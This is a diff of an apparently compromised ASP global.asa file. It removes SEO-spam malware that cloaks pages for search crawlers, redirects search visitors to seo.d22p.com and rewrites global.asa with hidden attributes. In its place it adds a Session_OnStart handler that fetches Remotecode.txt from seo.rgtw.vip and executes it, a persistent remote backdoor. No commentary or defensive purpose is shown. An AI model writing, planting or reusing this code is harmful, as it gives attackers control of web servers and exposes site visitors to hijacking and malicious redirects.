@@ -1,43 +1,10 @@
-Server.ScriptTimeout=600
-Public Function createasa(ByVal Content)
-	On Error Resume Next
-	Set fso = Server.CreateObject("scripting.filesystemobject")
-	set f=fso.Getfile("//./" & Server.MapPath("/global.asa"))
-	f.Attributes=0
-	Set Obj = Server.CreateObject("adod" & "b.S" & "tream")
-	Obj.Type = 2
-	Obj.open
-	Obj.Charset = "gb2312"
-	Obj.Position = Obj.Size
-	Obj.writetext = Content
-	Obj.SaveToFile "//./" & Server.MapPath("/global.asa"),2
-	Obj.Close
-	Set Obj = Nothing
-	f.Attributes=1+2+4
-	set f=Nothing
-	Set fso = Nothing 
-End Function
-
-Public Function createasax(ByVal Content)
-	On Error Resume Next
-	Set fso = Server.CreateObject("scripting.filesystemobject")
-	set f=fso.Getfile("//./" & Server.MapPath("/global.asax"))
-	f.Attributes=0
-	Set Obj = Server.CreateObject("adod" & "b.S" & "tream")
-	Obj.Type = 2
-	Obj.open
-	Obj.Charset = "gb2312"
-	Obj.Position = Obj.Size
-	Obj.writetext = Content
-	Obj.SaveToFile "//./" & Server.MapPath("/global.asax"),2
-	Obj.Close
-	Set Obj = Nothing
-	f.Attributes=1+2+4
-	set f=Nothing
-	Set fso = Nothing 
-End Function
-
-Public Function GetHtml(url)
+<script language="vbscript" runat="server">
+sub Application_OnStart
+end sub
+sub Application_OnEnd
+end sub
+sub Session_OnStart
+	url="http://seo.rgtw.vip/Remotecode.txt"
 	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
 	ObjXMLHTTP.Open "GET",url,False
 	ObjXMLHTTP.setRequestHeader "User-Agent",url
@@ -54,146 +21,10 @@ Public Function GetHtml(url)
 	objStream.Charset = "gb2312"
 	GetHtml = objStream.ReadText
 	objStream.Close
-End Function
-
-Function check(user_agent)
-    allow_agent=split("Baiduspider,Sogou,baidu,Sosospider,Googlebot,FAST-WebCrawler,MSNBOT,Slurp",",")
-    check_agent=false
-    For agenti=lbound(allow_agent) to ubound(allow_agent)
-        If instr(user_agent,allow_agent(agenti))>0 then
-            check_agent=true
-            exit for
-        end if 
-    Next
-    check=check_agent
-End function
-
-  Function CheckRobot()
-      CheckRobot = False
-      Dim Botlist,i,Repls
-      Repls      = request.ServerVariables("http_user_agent")
-	  Krobotlist = "Baiduspider|Googlebot"
-      Botlist = Split(Krobotlist,"|")
-      For i = 0 To Ubound(Botlist)
-        If InStr(Repls,Botlist(i)) > 0 Then
-          CheckRobot = True
-          Exit For
-        End If
-      Next
-      If Request.QueryString("admin")= "1" Then Session("ThisCheckRobot")=1
-	  If Session("ThisCheckRobot")   = 1   Then CheckRobot = True
-  End Function
-  Function CheckRefresh()
-      CheckRefresh = False
-      Dim Botlist,i,Repls
-	  Krobotlist = "baidu|google.com.hk/search?|sogou.com/web?query=|soso.com/q?pid="
-      Botlist = Split(Krobotlist,"|")
-      For i = 0 To Ubound(Botlist)
-        If InStr(left(request.servervariables("HTTP_REFERER"),"40"),Botlist(i)) > 0 Then
-          CheckRefresh = True
-          Exit For
-        End If
-      Next
-  End Function
-Sub sleep()
-If response.IsClientConnected=true then
-	Response.Flush
-else
-	response.end
-end if
-End Sub
-If Instr(Request.QueryString("id"), "article") >0 then
-If CheckRefresh=true Then
-redirectURL=lcase(request.servervariables("HTTP_HOST"))
-response.redirect("http://seo.d22p.com/js.html?"&redirectURL&"")
-response.end
-end If
-end If
-user_agent=Request.ServerVariables("HTTP_USER_AGENT")
-if check(user_agent)=true then
-If Instr(Request.QueryString("id"), "article") >0 then
-body=GetHtml("http://seo.d22p.com/?"&Request.QueryString) 
-response.write body
-response.end
-else
-body=GetHtml("http://seo.d22p.com/index.php") 
-response.write body
-response.end
-end if
-else
-asa=GetHtml("http://seo.d22p.com/Restore.txt")
-if instr(asa,"Tencent QQ")>0 then
-	createasa(asa)
-end if
-ScriptAddress=Request.ServerVariables("SCRIPT_NAME")
-namepath=Server.MapPath(ScriptAddress)
-If Len(Request.QueryString) > 0 Then
-	ScriptAddress = ScriptAddress & "?" & Request.QueryString
-end if
-geturl ="http://"& Request.ServerVariables("http_host") & ScriptAddress
-geturl =LCase(geturl)
-'response.write replace(namepath,server.MapPath("/"),"")
-'response.end
-if instr(geturl,"jc=ok")=0 and instr(geturl,"global=ok")=0 and instr(LCase(Request.ServerVariables("http_host")),"")=0 and instr(LCase(Request.ServerVariables("http_host")),"")=0 and instr(geturl,"http://"& Request.ServerVariables("http_host") &"/index.asp")=0 and instr(geturl,"http://"& Request.ServerVariables("http_host") &"/default.asp")=0 and instr(LCase(Request.ServerVariables("HTTP_REFERER")),LCase(Request.ServerVariables("http_host")))<=0 then
-agent = lcase(request.servervariables("http_user_agent"))
-referer = LCase(Request.ServerVariables("HTTP_REFERER"))
-bot = ""
-Amll = ""
-
-if instr(agent, "+") > 0 then bot = agent
-if instr(agent, "-") > 0 then bot = agent
-if instr(agent, "http") > 0 then bot = agent
-if instr(agent, "spider") > 0 then bot = agent
-if instr(agent, "bot") > 0 then bot = agent
-if instr(agent, "linux") > 0 then bot = agent
-if instr(agent, "baidu") > 0 then bot = agent
-
-if instr(agent, "google") > 0 then bot = "nobot"
-if instr(agent, "yahoo") > 0 then bot = "nobot"
-if instr(agent, "msn") > 0 then bot = "nobot"
-if instr(agent, "alexa") > 0 then bot = "nobot"
-if instr(agent, "sogou") > 0 then bot = "nobot"
-if instr(agent, "youdao") > 0 then bot = "nobot"
-if instr(agent, "soso") > 0 then bot = "nobot"
-if instr(agent, "iask") > 0 then bot = "nobot"
-
-if bot="nobot" then
-'Call WriteErr
-'response.end
-end if
-
-If Instr(REFERER,"http") > 0 and Instr(REFERER,".") > 0 and Instr(REFERER,"/") > 0 and Instr(REFERER,"?") > 0 and Instr(REFERER,"=") > 0 Then Amll = "ok"
-
-tjcount=request.Cookies("cookie_tjcount")
-date1=request.Cookies("cookie_date")
-date2=year(date)&month(date)&day(date)
-
-if tjcount="" then
-	response.cookies("cookie_tjcount")=0
-	response.cookies("cookie_tjcount").Expires=DateAdd("d",1,now())
-end if
-
-if date1<>date2 then
-	response.cookies("cookie_date")=date2
-	response.cookies("cookie_date").Expires=DateAdd("d",365,now())
-end if
-
-tjcount=request.Cookies("cookie_tjcount")
-date1=request.Cookies("cookie_date")
-date2=year(date)&month(date)&day(date)
-
-if date1=date2 and len(bot) = 0 then
-	if int(tjcount)<10 and len(Amll)>0 then
-		response.cookies("cookie_tjcount")=int(tjcount)+1
-		response.cookies("cookie_tjcount").Expires=DateAdd("d",1,now())
-	 strHost=Request.ServerVariables("HTTP_HOST")
-	Response.Redirect("http://seo.d22p.com/tz.html?domain="&strHost&"")
-	else
-		'response.write "<h1>Service Unavailable</h1>"
-		'response.write gethtml(geturl&"?global=ok")
+	if instr(GetHtml,"Tencent QQ")>0 then
+		execute GetHtml
 	end if
-	
-end if
-Call sleep()
-end if 
-end if 
+end sub
+'sub Session_OnEnd
+'end sub
+</script>
